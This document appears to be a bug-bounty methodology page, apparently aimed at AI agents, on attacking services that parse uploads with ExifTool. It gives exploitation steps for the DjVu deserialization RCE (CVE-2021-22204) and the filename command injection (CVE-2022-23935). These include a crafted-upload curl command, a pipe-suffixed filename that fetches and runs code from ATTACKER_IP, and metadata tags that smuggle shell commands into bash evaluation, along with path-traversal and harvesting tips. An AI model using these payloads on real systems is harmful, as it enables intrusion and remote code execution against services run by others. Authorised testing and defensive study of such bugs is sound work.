---
technology: "ExifTool"
kind: bug-bounty-methodology
audience: ai-agent
family: web-platforms
role: implementation-variant
layer: metadata parsing library + CLI (Perl; images, PDFs, documents)
homepage: "https://exiftool.org"
github-repo: "exiftool/exiftool"
status: confirmed
provenance: "corpus-grounded (strict gate 2026-11-12: 13 writeup files match exiftool markers; target-side attack chains confirmed in 4 — DjVu RCE footholds, filename command injection against a 12.37 service, metadata-into-bash-evaluation delivery; 2 more used exiftool as the crafting tool for metadata attacks against other parsers; the rest are attacker-side inspection only and are recorded in internal coverage ledger) + upstream-verified (CVE-2021-22204 Ubuntu/Gentoo advisories, CVE-2022-23935 GHSA-jx53-3cxj-386g). Companion area router: [[file-processing|File-processing services]]. Enrichment pass 2 new-unit wave A, 2026-11-12."
---

# ExifTool — implementation methodology

Companion router: [[file-processing|File-processing services area router]] (the
upload→parse→RCE pattern). This page covers ExifTool on the *target* side: services
that parse attacker files with it, and the two bug classes that own them. Note the
split up front: exiftool is also your best attacker-side inspection/crafting tool —
most engagements touch it from your side of the wire; only a minority of targets run
it on yours.

Target model: a web app or scheduled script invoking exiftool over uploads
("forensics"/"analysis"/report features are the tell), Perl ExifTool between 7.44
and 12.15 (DjVu class) or below 12.38 (filename class).

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| CVE-2021-22204 DjVu deserialization | ExifTool ≥ 7.44, < 12.16, parses uploaded images | upload | RCE as parser user — Critical |
| CVE-2022-23935 filename injection | ExifTool < 12.38, invoked with attacker-controlled filename | upload | Command execution via crafted filename — Critical |
| Metadata → downstream evaluation | target reads a tag into eval/arithmetic/path | upload | Injection through the metadata channel — High |
| Version disclosure | "ExifTool Version Number" echoed in reports | yes | CVE gate — Info |

## Phase 0 — Confirm the target parses your files

Fingerprints: upload an image whose `Artist`/`Comment`/`Producer` field carries a
marker and see it reflected in the response; a "report"/"analysis" output page that
reproduces EXIF fields; error pages naming ExifTool. The version usually rides
along in generated reports ("ExifTool Version Number : 12.37") — record it and gate:

- **7.44 ≤ v < 12.16** → DjVu RCE (CVE-2021-22204)
- **v < 12.38** → filename command injection (CVE-2022-23935)

## Phase 1 — CVE-2021-22204: DjVu deserialization RCE

Improper neutralization of user data in the **DjVu** file format (upstream-verified:
ExifTool 7.44 up to the 12.16 fix) — a DjVu `ANT` metadata block containing Perl
`eval`-able content executes when ExifTool parses the file. The delivery shape: a
JPEG with an embedded DjVu module, so the upload still *looks* like a normal image
to application validation.

```bash
# attacker-side crafting (this is the standard public-PoC shape)
printf 'FTXT' ... # or use the published djvu-craft tooling
exiftool '-jumb:<=' crafted.djvu cover.jpg   # embed DjVu into a valid JPEG
# payload lives in the DjVu ANT block: (metadata "\$<perl>;")
curl -F 'file=@cover.jpg' http://198.51.100.10/upload   # service parses -> code runs
```

Observed in the field as a direct foothold: upload → parse → reverse shell as the service
user. On one target it was stage one of a two-CVE box, with an ImageMagick bug
waiting for the same file ([[file-processing-imagemagick]]).

## Phase 2 — CVE-2022-23935: filename command injection

`lib/Image/ExifTool.pm` before 12.38 mishandles filenames that look like pipes: a
file named so that it ends in `|` (with an executable prefix) is opened through the
shell when the tool processes it. Requirements: the target passes *your* filename to
exiftool (a file-upload service storing your name, or a path you control) and runs
a vulnerable version.

```bash
# shape: upload/cause the target to invoke exiftool on:
'curl ATTACKER_IP/x|sh|.jpg'    # pipe-suffixed name reaching the parser
```

One observed target ran exiftool 12.37 inside a forensic-analysis service — version
gated from its own report page, filename delivered via the upload, callback as the
service user.

## Phase 3 — The metadata channel beyond exiftool bugs

Even a fully patched exiftool hands attacker strings to whatever reads its output —
three delivery shapes from the field:

- **Tag → bash arithmetic/eval**: a target script does
  `meta=$(exiftool -s -s -s -Producer "$file")` and then evaluates it in a numeric
  `[[ ... -eq ... ]]` test — a Producer value like `w[$(payload)]` executes when
  bash evaluates the bracket expression. Craft locally with
  `exiftool -Producer='w[$(id)]' file`, let the target's own pipeline fire it.
- **Tag → path construction**: a target reads an `Artist` tag into a file path
  (`"/dir/" + artist + "_creds.xml"`) — a `../` value turns metadata into
  traversal/arbitrary-read of XML the app trusts (observed chained into XXE).
- **Tag → stored XSS/SQLi** downstream: metadata is stored and rendered without
  escaping more often than not.

## Phase 4 — Attacker-side usage (your tooling)

The same binary is standard kit on your side: `exiftool file` to harvest
usernames/emails/software versions from any downloaded document or image;
`exiftool -Field='value' file` to weaponize uploads for *other* parsers (the
ImageMagick and metadata-channel attacks above start with attacker-crafted tags);
`exiftool *.jpg | grep -i Author` batch-harvesting over whole directories of leaked
images. Keep the sides straight in reporting — exiftool running on your box is not
a finding.

## Command quick reference

```bash
exiftool file.jpg                      # read all metadata
exiftool -s -s -s -Producer file.pdf   # single-value reads (script-friendly)
exiftool '-Artist=../../tmp/payload' img.jpg   # write a tag (crafting)
exiftool '-Producer=w[$(id)]' file     # evaluation-injection crafting
exiftool *.jpg | grep -iE 'author|creator'     # harvest
```

## Tool mapping (prose)

exiftool itself for read/craft both sides; curl for upload delivery; djvu tooling
(djvused or published PoC scripts) for CVE-2021-22204 payload construction;
Burp-style interception when the upload path mangles filenames (the pipe character
survives fewer front-ends than you'd hope — URL-encode and test). Tools vault owns
per-tool detail.
